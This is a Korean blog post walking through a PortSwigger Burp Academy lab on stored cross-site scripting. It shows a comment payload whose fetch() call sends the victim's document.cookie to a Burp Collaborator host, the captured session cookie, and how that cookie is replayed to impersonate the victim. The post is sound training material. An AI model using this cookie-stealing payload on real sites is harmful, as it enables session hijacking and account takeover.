---
layout: post
title: "Burp Academy-XSS 취약점: Exploiting cross-site scripting to steal cookies"
categories: [보안취약점, Burp Academy]
tags: [보안취약점, Burp Academy, XSS취약점]
toc: true
last_modified_at: 2023-07-24 10:48:00 +0900
---

# 개요
- Stored 타입의 XSS 취약점 문제이다. 
- 문제 주소: https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies
- 난이도: PRACTITIONER (보통)

# 문제
- 커멘트 저장하는 부분에 Stored XSS취약점이 존재한다. 
- victim의 세션 쿠키를 얻어내서 victim 계정으로 서버에 접근하면 문제가 풀린다. 
- 문제를 풀려면 정식 Collaborator서버를 사용해야 한다. 

```
This lab contains a stored XSS vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim's session cookie, then use this cookie to impersonate the victim.

Note
To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's default public server.

Some users will notice that there is an alternative solution to this lab that does not require Burp Collaborator. However, it is far less subtle than exfiltrating the cookie.
```


# 풀이 
- 문제에는 exploit서버가 주어지지 않는다. 
- 따라서 victim의 정보를 얻어내기 burp collaborator서버를 이용해야할 것 같다. 


Burp Suite에서 Burp Collaborator 페이로드를 하나 생성한다. 

그리고 해당 페이로드를 적용한 다음 exploit 코드를 웹 페이지의 커멘트에 저장한다. 작성자 이름과 메일 주소는 대충 적는다. 


```js
<script>
    fetch("https://b7jecv28f5s24fbxseef7kpoefk684wt.oastify.com?cookie="+encodeURIComponent(document.cookie))
</script>
```

커멘트를 저장한 후 블로그 글 상세보기 화면으로 돌아온다. 그리고 Burp Suite에서 collaborator서버 탭을 보면 다음 처럼 핑백이 나타난 것을 확인할 수 있다. victim 유저의 쿠키 값을 확인할 수 있다. URL 디코딩한 값은 다음과 같다. 

```
secret=Y8vNwX8F26uo4ZIMu7pv4MfHzuIMwr50; session=aD7nFaiUl2LcLrx2wK3NullmzDxF3LxR
```

![collaborator서버결과](/images/burp-academy-xss-13-1.png)

이제 victim으로 로그인하면 문제가 풀릴 것이다. 문제 서버의 홈으로 이동하는 요청을 Burp Proxy로 캡쳐하고 session의 값을 위에서 얻은 victim의 세션값으로 변경하고 요청을 보낸다. 그러면 문제 풀이에 성공했다는 메세지가 출력된다. 

![풀이성공](/images/burp-academy-xss-13-success.png)